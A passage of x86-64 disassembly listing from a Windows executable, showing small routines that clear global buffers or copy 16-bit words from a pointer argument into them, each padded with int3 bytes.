   140008e1d:	0f 29 05 2c 7b 2b 00 	movaps %xmm0,0x2b7b2c(%rip)        # 0x1402c0950
   140008e24:	0f 29 05 15 7b 2b 00 	movaps %xmm0,0x2b7b15(%rip)        # 0x1402c0940
   140008e2b:	66 c7 05 8c 7b 2b 00 	movw   $0x0,0x2b7b8c(%rip)        # 0x1402c09c0
   140008e32:	00 00 
   140008e34:	c3                   	ret
   140008e35:	cc                   	int3
   140008e36:	cc                   	int3
   140008e37:	cc                   	int3
   140008e38:	cc                   	int3
   140008e39:	cc                   	int3
   140008e3a:	cc                   	int3
   140008e3b:	cc                   	int3
   140008e3c:	cc                   	int3
   140008e3d:	cc                   	int3
   140008e3e:	cc                   	int3
   140008e3f:	cc                   	int3
   140008e40:	c6 05 ab 7b 2b 00 01 	movb   $0x1,0x2b7bab(%rip)        # 0x1402c09f2
   140008e47:	0f b7 01             	movzwl (%rcx),%eax
   140008e4a:	66 89 05 7f 7b 2b 00 	mov    %ax,0x2b7b7f(%rip)        # 0x1402c09d0
   140008e51:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008e55:	66 89 05 76 7b 2b 00 	mov    %ax,0x2b7b76(%rip)        # 0x1402c09d2
   140008e5c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008e60:	66 89 05 6d 7b 2b 00 	mov    %ax,0x2b7b6d(%rip)        # 0x1402c09d4
   140008e67:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008e6b:	66 89 05 64 7b 2b 00 	mov    %ax,0x2b7b64(%rip)        # 0x1402c09d6
   140008e72:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008e76:	66 89 05 5b 7b 2b 00 	mov    %ax,0x2b7b5b(%rip)        # 0x1402c09d8
   140008e7d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008e81:	66 89 05 52 7b 2b 00 	mov    %ax,0x2b7b52(%rip)        # 0x1402c09da
   140008e88:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008e8c:	66 89 05 49 7b 2b 00 	mov    %ax,0x2b7b49(%rip)        # 0x1402c09dc
   140008e93:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008e97:	66 89 05 40 7b 2b 00 	mov    %ax,0x2b7b40(%rip)        # 0x1402c09de
   140008e9e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008ea2:	66 89 05 37 7b 2b 00 	mov    %ax,0x2b7b37(%rip)        # 0x1402c09e0
   140008ea9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008ead:	66 89 05 2e 7b 2b 00 	mov    %ax,0x2b7b2e(%rip)        # 0x1402c09e2
   140008eb4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008eb8:	66 89 05 25 7b 2b 00 	mov    %ax,0x2b7b25(%rip)        # 0x1402c09e4
   140008ebf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008ec3:	66 89 05 1c 7b 2b 00 	mov    %ax,0x2b7b1c(%rip)        # 0x1402c09e6
   140008eca:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008ece:	66 89 05 13 7b 2b 00 	mov    %ax,0x2b7b13(%rip)        # 0x1402c09e8
   140008ed5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008ed9:	66 89 05 0a 7b 2b 00 	mov    %ax,0x2b7b0a(%rip)        # 0x1402c09ea
   140008ee0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008ee4:	66 89 05 01 7b 2b 00 	mov    %ax,0x2b7b01(%rip)        # 0x1402c09ec
   140008eeb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008eef:	66 89 05 f8 7a 2b 00 	mov    %ax,0x2b7af8(%rip)        # 0x1402c09ee
   140008ef6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008efa:	66 89 05 ef 7a 2b 00 	mov    %ax,0x2b7aef(%rip)        # 0x1402c09f0
   140008f01:	c3                   	ret
   140008f02:	cc                   	int3
   140008f03:	cc                   	int3
   140008f04:	cc                   	int3
   140008f05:	cc                   	int3
   140008f06:	cc                   	int3
   140008f07:	cc                   	int3
   140008f08:	cc                   	int3
   140008f09:	cc                   	int3
   140008f0a:	cc                   	int3
   140008f0b:	cc                   	int3
   140008f0c:	cc                   	int3
   140008f0d:	cc                   	int3
   140008f0e:	cc                   	int3
   140008f0f:	cc                   	int3
   140008f10:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008f13:	0f 29 05 c6 7a 2b 00 	movaps %xmm0,0x2b7ac6(%rip)        # 0x1402c09e0
   140008f1a:	0f 29 05 af 7a 2b 00 	movaps %xmm0,0x2b7aaf(%rip)        # 0x1402c09d0
   140008f21:	66 c7 05 c6 7a 2b 00 	movw   $0x0,0x2b7ac6(%rip)        # 0x1402c09f0
   140008f28:	00 00 
   140008f2a:	c3                   	ret
   140008f2b:	cc                   	int3
   140008f2c:	cc                   	int3
   140008f2d:	cc                   	int3
   140008f2e:	cc                   	int3
   140008f2f:	cc                   	int3
   140008f30:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008f33:	0f 11 05 30 7b 2b 00 	movups %xmm0,0x2b7b30(%rip)        # 0x1402c0a6a
   140008f3a:	0f 29 05 1f 7b 2b 00 	movaps %xmm0,0x2b7b1f(%rip)        # 0x1402c0a60
   140008f41:	0f 29 05 08 7b 2b 00 	movaps %xmm0,0x2b7b08(%rip)        # 0x1402c0a50
   140008f48:	0f 29 05 f1 7a 2b 00 	movaps %xmm0,0x2b7af1(%rip)        # 0x1402c0a40
   140008f4f:	0f 29 05 da 7a 2b 00 	movaps %xmm0,0x2b7ada(%rip)        # 0x1402c0a30
   140008f56:	0f 29 05 c3 7a 2b 00 	movaps %xmm0,0x2b7ac3(%rip)        # 0x1402c0a20
   140008f5d:	0f 29 05 ac 7a 2b 00 	movaps %xmm0,0x2b7aac(%rip)        # 0x1402c0a10
   140008f64:	0f 29 05 95 7a 2b 00 	movaps %xmm0,0x2b7a95(%rip)        # 0x1402c0a00
   140008f6b:	c3                   	ret
   140008f6c:	cc                   	int3
   140008f6d:	cc                   	int3
   140008f6e:	cc                   	int3
   140008f6f:	cc                   	int3
   140008f70:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008f73:	0f 11 05 10 7b 2b 00 	movups %xmm0,0x2b7b10(%rip)        # 0x1402c0a8a
   140008f7a:	0f 29 05 ff 7a 2b 00 	movaps %xmm0,0x2b7aff(%rip)        # 0x1402c0a80
   140008f81:	c3                   	ret
   140008f82:	cc                   	int3
   140008f83:	cc                   	int3
   140008f84:	cc                   	int3
   140008f85:	cc                   	int3
   140008f86:	cc                   	int3
   140008f87:	cc                   	int3
   140008f88:	cc                   	int3
   140008f89:	cc                   	int3
   140008f8a:	cc                   	int3
   140008f8b:	cc                   	int3
   140008f8c:	cc                   	int3
   140008f8d:	cc                   	int3
   140008f8e:	cc                   	int3
   140008f8f:	cc                   	int3
   140008f90:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008f93:	0f 29 05 66 7b 2b 00 	movaps %xmm0,0x2b7b66(%rip)        # 0x1402c0b00
   140008f9a:	0f 29 05 4f 7b 2b 00 	movaps %xmm0,0x2b7b4f(%rip)        # 0x1402c0af0
   140008fa1:	0f 29 05 38 7b 2b 00 	movaps %xmm0,0x2b7b38(%rip)        # 0x1402c0ae0
   140008fa8:	0f 29 05 21 7b 2b 00 	movaps %xmm0,0x2b7b21(%rip)        # 0x1402c0ad0
   140008faf:	0f 29 05 0a 7b 2b 00 	movaps %xmm0,0x2b7b0a(%rip)        # 0x1402c0ac0
   140008fb6:	0f 29 05 f3 7a 2b 00 	movaps %xmm0,0x2b7af3(%rip)        # 0x1402c0ab0
   140008fbd:	0f 29 05 dc 7a 2b 00 	movaps %xmm0,0x2b7adc(%rip)        # 0x1402c0aa0
   140008fc4:	66 c7 05 43 7b 2b 00 	movw   $0x0,0x2b7b43(%rip)        # 0x1402c0b10
   140008fcb:	00 00 
   140008fcd:	c3                   	ret
   140008fce:	cc                   	int3
   140008fcf:	cc                   	int3
   140008fd0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008fd3:	0f 29 05 46 7b 2b 00 	movaps %xmm0,0x2b7b46(%rip)        # 0x1402c0b20
   140008fda:	66 c7 05 4d 7b 2b 00 	movw   $0x0,0x2b7b4d(%rip)        # 0x1402c0b30
   140008fe1:	00 00 
   140008fe3:	c3                   	ret
   140008fe4:	cc                   	int3
   140008fe5:	cc                   	int3
   140008fe6:	cc                   	int3
   140008fe7:	cc                   	int3
   140008fe8:	cc                   	int3
   140008fe9:	cc                   	int3
   140008fea:	cc                   	int3
   140008feb:	cc                   	int3
   140008fec:	cc                   	int3
   140008fed:	cc                   	int3
   140008fee:	cc                   	int3
   140008fef:	cc                   	int3
   140008ff0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008ff3:	0f 29 05 a6 7b 2b 00 	movaps %xmm0,0x2b7ba6(%rip)        # 0x1402c0ba0
   140008ffa:	0f 29 05 8f 7b 2b 00 	movaps %xmm0,0x2b7b8f(%rip)        # 0x1402c0b90
   140009001:	0f 29 05 78 7b 2b 00 	movaps %xmm0,0x2b7b78(%rip)        # 0x1402c0b80
   140009008:	0f 29 05 61 7b 2b 00 	movaps %xmm0,0x2b7b61(%rip)        # 0x1402c0b70
   14000900f:	0f 29 05 4a 7b 2b 00 	movaps %xmm0,0x2b7b4a(%rip)        # 0x1402c0b60
   140009016:	0f 29 05 33 7b 2b 00 	movaps %xmm0,0x2b7b33(%rip)        # 0x1402c0b50
   14000901d:	0f 29 05 1c 7b 2b 00 	movaps %xmm0,0x2b7b1c(%rip)        # 0x1402c0b40
   140009024:	c7 05 82 7b 2b 00 00 	movl   $0x0,0x2b7b82(%rip)        # 0x1402c0bb0
   14000902b:	00 00 00 
   14000902e:	c3                   	ret
   14000902f:	cc                   	int3
   140009030:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009033:	0f 29 05 86 7b 2b 00 	movaps %xmm0,0x2b7b86(%rip)        # 0x1402c0bc0
   14000903a:	c7 05 8c 7b 2b 00 00 	movl   $0x0,0x2b7b8c(%rip)        # 0x1402c0bd0
   140009041:	00 00 00 
   140009044:	c3                   	ret
   140009045:	cc                   	int3
   140009046:	cc                   	int3
   140009047:	cc                   	int3
   140009048:	cc                   	int3
   140009049:	cc                   	int3
   14000904a:	cc                   	int3
   14000904b:	cc                   	int3
   14000904c:	cc                   	int3
   14000904d:	cc                   	int3
   14000904e:	cc                   	int3
   14000904f:	cc                   	int3
   140009050:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009053:	0f 11 05 92 7b 2b 00 	movups %xmm0,0x2b7b92(%rip)        # 0x1402c0bec
   14000905a:	0f 29 05 7f 7b 2b 00 	movaps %xmm0,0x2b7b7f(%rip)        # 0x1402c0be0
   140009061:	c3                   	ret
   140009062:	cc                   	int3
   140009063:	cc                   	int3
   140009064:	cc                   	int3
   140009065:	cc                   	int3
   140009066:	cc                   	int3
   140009067:	cc                   	int3
   140009068:	cc                   	int3
   140009069:	cc                   	int3
   14000906a:	cc                   	int3
   14000906b:	cc                   	int3
   14000906c:	cc                   	int3
   14000906d:	cc                   	int3
   14000906e:	cc                   	int3
   14000906f:	cc                   	int3
   140009070:	c6 05 c5 7b 2b 00 01 	movb   $0x1,0x2b7bc5(%rip)        # 0x1402c0c3c
   140009077:	0f b7 01             	movzwl (%rcx),%eax
   14000907a:	66 89 05 7f 7b 2b 00 	mov    %ax,0x2b7b7f(%rip)        # 0x1402c0c00
   140009081:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009085:	66 89 05 76 7b 2b 00 	mov    %ax,0x2b7b76(%rip)        # 0x1402c0c02
   14000908c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009090:	66 89 05 6d 7b 2b 00 	mov    %ax,0x2b7b6d(%rip)        # 0x1402c0c04
   140009097:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000909b:	66 89 05 64 7b 2b 00 	mov    %ax,0x2b7b64(%rip)        # 0x1402c0c06
   1400090a2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400090a6:	66 89 05 5b 7b 2b 00 	mov    %ax,0x2b7b5b(%rip)        # 0x1402c0c08
   1400090ad:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400090b1:	66 89 05 52 7b 2b 00 	mov    %ax,0x2b7b52(%rip)        # 0x1402c0c0a
   1400090b8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400090bc:	66 89 05 49 7b 2b 00 	mov    %ax,0x2b7b49(%rip)        # 0x1402c0c0c
   1400090c3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400090c7:	66 89 05 40 7b 2b 00 	mov    %ax,0x2b7b40(%rip)        # 0x1402c0c0e
   1400090ce:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400090d2:	66 89 05 37 7b 2b 00 	mov    %ax,0x2b7b37(%rip)        # 0x1402c0c10
   1400090d9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400090dd:	66 89 05 2e 7b 2b 00 	mov    %ax,0x2b7b2e(%rip)        # 0x1402c0c12
   1400090e4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400090e8:	66 89 05 25 7b 2b 00 	mov    %ax,0x2b7b25(%rip)        # 0x1402c0c14
   1400090ef:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400090f3:	66 89 05 1c 7b 2b 00 	mov    %ax,0x2b7b1c(%rip)        # 0x1402c0c16
   1400090fa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400090fe:	66 89 05 13 7b 2b 00 	mov    %ax,0x2b7b13(%rip)        # 0x1402c0c18
   140009105:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009109:	66 89 05 0a 7b 2b 00 	mov    %ax,0x2b7b0a(%rip)        # 0x1402c0c1a
   140009110:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009114:	66 89 05 01 7b 2b 00 	mov    %ax,0x2b7b01(%rip)        # 0x1402c0c1c
   14000911b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000911f:	66 89 05 f8 7a 2b 00 	mov    %ax,0x2b7af8(%rip)        # 0x1402c0c1e
   140009126:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000912a:	66 89 05 ef 7a 2b 00 	mov    %ax,0x2b7aef(%rip)        # 0x1402c0c20
   140009131:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009135:	66 89 05 e6 7a 2b 00 	mov    %ax,0x2b7ae6(%rip)        # 0x1402c0c22
   14000913c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009140:	66 89 05 dd 7a 2b 00 	mov    %ax,0x2b7add(%rip)        # 0x1402c0c24
   140009147:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000914b:	66 89 05 d4 7a 2b 00 	mov    %ax,0x2b7ad4(%rip)        # 0x1402c0c26
   140009152:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009156:	66 89 05 cb 7a 2b 00 	mov    %ax,0x2b7acb(%rip)        # 0x1402c0c28
   14000915d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140009161:	66 89 05 c2 7a 2b 00 	mov    %ax,0x2b7ac2(%rip)        # 0x1402c0c2a
   140009168:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000916c:	66 89 05 b9 7a 2b 00 	mov    %ax,0x2b7ab9(%rip)        # 0x1402c0c2c
   140009173:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140009177:	66 89 05 b0 7a 2b 00 	mov    %ax,0x2b7ab0(%rip)        # 0x1402c0c2e
   14000917e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140009182:	66 89 05 a7 7a 2b 00 	mov    %ax,0x2b7aa7(%rip)        # 0x1402c0c30
   140009189:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000918d:	66 89 05 9e 7a 2b 00 	mov    %ax,0x2b7a9e(%rip)        # 0x1402c0c32
   140009194:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140009198:	66 89 05 95 7a 2b 00 	mov    %ax,0x2b7a95(%rip)        # 0x1402c0c34
   14000919f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   1400091a3:	66 89 05 8c 7a 2b 00 	mov    %ax,0x2b7a8c(%rip)        # 0x1402c0c36
   1400091aa:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   1400091ae:	66 89 05 83 7a 2b 00 	mov    %ax,0x2b7a83(%rip)        # 0x1402c0c38
   1400091b5:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   1400091b9:	66 89 05 7a 7a 2b 00 	mov    %ax,0x2b7a7a(%rip)        # 0x1402c0c3a
   1400091c0:	c3                   	ret
   1400091c1:	cc                   	int3
   1400091c2:	cc                   	int3
   1400091c3:	cc                   	int3
   1400091c4:	cc                   	int3
   1400091c5:	cc                   	int3
   1400091c6:	cc                   	int3
   1400091c7:	cc                   	int3
   1400091c8:	cc                   	int3
   1400091c9:	cc                   	int3
   1400091ca:	cc                   	int3
   1400091cb:	cc                   	int3
   1400091cc:	cc                   	int3
   1400091cd:	cc                   	int3
   1400091ce:	cc                   	int3
   1400091cf:	cc                   	int3
   1400091d0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400091d3:	0f 11 05 52 7a 2b 00 	movups %xmm0,0x2b7a52(%rip)        # 0x1402c0c2c
   1400091da:	0f 11 05 3f 7a 2b 00 	movups %xmm0,0x2b7a3f(%rip)        # 0x1402c0c20
   1400091e1:	0f 11 05 28 7a 2b 00 	movups %xmm0,0x2b7a28(%rip)        # 0x1402c0c10
   1400091e8:	0f 11 05 11 7a 2b 00 	movups %xmm0,0x2b7a11(%rip)        # 0x1402c0c00
   1400091ef:	c3                   	ret
   1400091f0:	c6 05 85 7a 2b 00 01 	movb   $0x1,0x2b7a85(%rip)        # 0x1402c0c7c
   1400091f7:	0f b7 01             	movzwl (%rcx),%eax
   1400091fa:	66 89 05 3f 7a 2b 00 	mov    %ax,0x2b7a3f(%rip)        # 0x1402c0c40
   140009201:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009205:	66 89 05 36 7a 2b 00 	mov    %ax,0x2b7a36(%rip)        # 0x1402c0c42
   14000920c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009210:	66 89 05 2d 7a 2b 00 	mov    %ax,0x2b7a2d(%rip)        # 0x1402c0c44
   140009217:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000921b:	66 89 05 24 7a 2b 00 	mov    %ax,0x2b7a24(%rip)        # 0x1402c0c46
   140009222:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009226:	66 89 05 1b 7a 2b 00 	mov    %ax,0x2b7a1b(%rip)        # 0x1402c0c48
   14000922d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009231:	66 89 05 12 7a 2b 00 	mov    %ax,0x2b7a12(%rip)        # 0x1402c0c4a
   140009238:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000923c:	66 89 05 09 7a 2b 00 	mov    %ax,0x2b7a09(%rip)        # 0x1402c0c4c
   140009243:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009247:	66 89 05 00 7a 2b 00 	mov    %ax,0x2b7a00(%rip)        # 0x1402c0c4e
   14000924e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009252:	66 89 05 f7 79 2b 00 	mov    %ax,0x2b79f7(%rip)        # 0x1402c0c50
   140009259:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000925d:	66 89 05 ee 79 2b 00 	mov    %ax,0x2b79ee(%rip)        # 0x1402c0c52
   140009264:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009268:	66 89 05 e5 79 2b 00 	mov    %ax,0x2b79e5(%rip)        # 0x1402c0c54
   14000926f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009273:	66 89 05 dc 79 2b 00 	mov    %ax,0x2b79dc(%rip)        # 0x1402c0c56
   14000927a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000927e:	66 89 05 d3 79 2b 00 	mov    %ax,0x2b79d3(%rip)        # 0x1402c0c58
   140009285:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009289:	66 89 05 ca 79 2b 00 	mov    %ax,0x2b79ca(%rip)        # 0x1402c0c5a
   140009290:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009294:	66 89 05 c1 79 2b 00 	mov    %ax,0x2b79c1(%rip)        # 0x1402c0c5c
   14000929b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000929f:	66 89 05 b8 79 2b 00 	mov    %ax,0x2b79b8(%rip)        # 0x1402c0c5e
   1400092a6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400092aa:	66 89 05 af 79 2b 00 	mov    %ax,0x2b79af(%rip)        # 0x1402c0c60
   1400092b1:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   1400092b5:	66 89 05 a6 79 2b 00 	mov    %ax,0x2b79a6(%rip)        # 0x1402c0c62
   1400092bc:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   1400092c0:	66 89 05 9d 79 2b 00 	mov    %ax,0x2b799d(%rip)        # 0x1402c0c64
   1400092c7:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   1400092cb:	66 89 05 94 79 2b 00 	mov    %ax,0x2b7994(%rip)        # 0x1402c0c66
   1400092d2:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   1400092d6:	66 89 05 8b 79 2b 00 	mov    %ax,0x2b798b(%rip)        # 0x1402c0c68
   1400092dd:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   1400092e1:	66 89 05 82 79 2b 00 	mov    %ax,0x2b7982(%rip)        # 0x1402c0c6a
   1400092e8:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   1400092ec:	66 89 05 79 79 2b 00 	mov    %ax,0x2b7979(%rip)        # 0x1402c0c6c
   1400092f3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   1400092f7:	66 89 05 70 79 2b 00 	mov    %ax,0x2b7970(%rip)        # 0x1402c0c6e
   1400092fe:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140009302:	66 89 05 67 79 2b 00 	mov    %ax,0x2b7967(%rip)        # 0x1402c0c70
   140009309:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000930d:	66 89 05 5e 79 2b 00 	mov    %ax,0x2b795e(%rip)        # 0x1402c0c72
   140009314:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140009318:	66 89 05 55 79 2b 00 	mov    %ax,0x2b7955(%rip)        # 0x1402c0c74
   14000931f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140009323:	66 89 05 4c 79 2b 00 	mov    %ax,0x2b794c(%rip)        # 0x1402c0c76
   14000932a:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   14000932e:	66 89 05 43 79 2b 00 	mov    %ax,0x2b7943(%rip)        # 0x1402c0c78
   140009335:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140009339:	66 89 05 3a 79 2b 00 	mov    %ax,0x2b793a(%rip)        # 0x1402c0c7a
   140009340:	c3                   	ret
   140009341:	cc                   	int3
   140009342:	cc                   	int3
   140009343:	cc                   	int3
   140009344:	cc                   	int3
   140009345:	cc                   	int3
   140009346:	cc                   	int3
   140009347:	cc                   	int3
   140009348:	cc                   	int3
   140009349:	cc                   	int3
   14000934a:	cc                   	int3
   14000934b:	cc                   	int3
   14000934c:	cc                   	int3
   14000934d:	cc                   	int3
   14000934e:	cc                   	int3
   14000934f:	cc                   	int3
   140009350:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009353:	0f 11 05 12 79 2b 00 	movups %xmm0,0x2b7912(%rip)        # 0x1402c0c6c
   14000935a:	0f 11 05 ff 78 2b 00 	movups %xmm0,0x2b78ff(%rip)        # 0x1402c0c60
   140009361:	0f 11 05 e8 78 2b 00 	movups %xmm0,0x2b78e8(%rip)        # 0x1402c0c50
   140009368:	0f 11 05 d1 78 2b 00 	movups %xmm0,0x2b78d1(%rip)        # 0x1402c0c40
   14000936f:	c3                   	ret
   140009370:	c6 05 41 79 2b 00 01 	movb   $0x1,0x2b7941(%rip)        # 0x1402c0cb8
   140009377:	0f b7 01             	movzwl (%rcx),%eax
   14000937a:	66 89 05 ff 78 2b 00 	mov    %ax,0x2b78ff(%rip)        # 0x1402c0c80
   140009381:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009385:	66 89 05 f6 78 2b 00 	mov    %ax,0x2b78f6(%rip)        # 0x1402c0c82
   14000938c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009390:	66 89 05 ed 78 2b 00 	mov    %ax,0x2b78ed(%rip)        # 0x1402c0c84
   140009397:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000939b:	66 89 05 e4 78 2b 00 	mov    %ax,0x2b78e4(%rip)        # 0x1402c0c86
   1400093a2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400093a6:	66 89 05 db 78 2b 00 	mov    %ax,0x2b78db(%rip)        # 0x1402c0c88
   1400093ad:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400093b1:	66 89 05 d2 78 2b 00 	mov    %ax,0x2b78d2(%rip)        # 0x1402c0c8a
   1400093b8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400093bc:	66 89 05 c9 78 2b 00 	mov    %ax,0x2b78c9(%rip)        # 0x1402c0c8c
   1400093c3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400093c7:	66 89 05 c0 78 2b 00 	mov    %ax,0x2b78c0(%rip)        # 0x1402c0c8e
   1400093ce:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400093d2:	66 89 05 b7 78 2b 00 	mov    %ax,0x2b78b7(%rip)        # 0x1402c0c90
   1400093d9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400093dd:	66 89 05 ae 78 2b 00 	mov    %ax,0x2b78ae(%rip)        # 0x1402c0c92
   1400093e4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400093e8:	66 89 05 a5 78 2b 00 	mov    %ax,0x2b78a5(%rip)        # 0x1402c0c94
   1400093ef:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400093f3:	66 89 05 9c 78 2b 00 	mov    %ax,0x2b789c(%rip)        # 0x1402c0c96
   1400093fa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400093fe:	66 89 05 93 78 2b 00 	mov    %ax,0x2b7893(%rip)        # 0x1402c0c98
   140009405:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009409:	66 89 05 8a 78 2b 00 	mov    %ax,0x2b788a(%rip)        # 0x1402c0c9a
   140009410:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009414:	66 89 05 81 78 2b 00 	mov    %ax,0x2b7881(%rip)        # 0x1402c0c9c
   14000941b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000941f:	66 89 05 78 78 2b 00 	mov    %ax,0x2b7878(%rip)        # 0x1402c0c9e
   140009426:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000942a:	66 89 05 6f 78 2b 00 	mov    %ax,0x2b786f(%rip)        # 0x1402c0ca0
   140009431:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009435:	66 89 05 66 78 2b 00 	mov    %ax,0x2b7866(%rip)        # 0x1402c0ca2
   14000943c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009440:	66 89 05 5d 78 2b 00 	mov    %ax,0x2b785d(%rip)        # 0x1402c0ca4
   140009447:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000944b:	66 89 05 54 78 2b 00 	mov    %ax,0x2b7854(%rip)        # 0x1402c0ca6
   140009452:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009456:	66 89 05 4b 78 2b 00 	mov    %ax,0x2b784b(%rip)        # 0x1402c0ca8
   14000945d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140009461:	66 89 05 42 78 2b 00 	mov    %ax,0x2b7842(%rip)        # 0x1402c0caa
   140009468:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000946c:	66 89 05 39 78 2b 00 	mov    %ax,0x2b7839(%rip)        # 0x1402c0cac
   140009473:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140009477:	66 89 05 30 78 2b 00 	mov    %ax,0x2b7830(%rip)        # 0x1402c0cae
   14000947e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140009482:	66 89 05 27 78 2b 00 	mov    %ax,0x2b7827(%rip)        # 0x1402c0cb0
   140009489:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000948d:	66 89 05 1e 78 2b 00 	mov    %ax,0x2b781e(%rip)        # 0x1402c0cb2
   140009494:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140009498:	66 89 05 15 78 2b 00 	mov    %ax,0x2b7815(%rip)        # 0x1402c0cb4
   14000949f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   1400094a3:	66 89 05 0c 78 2b 00 	mov    %ax,0x2b780c(%rip)        # 0x1402c0cb6
   1400094aa:	c3                   	ret
   1400094ab:	cc                   	int3
   1400094ac:	cc                   	int3
   1400094ad:	cc                   	int3
   1400094ae:	cc                   	int3
   1400094af:	cc                   	int3
   1400094b0:	0f 57 c0             	xorps  %xmm0,%xmm0
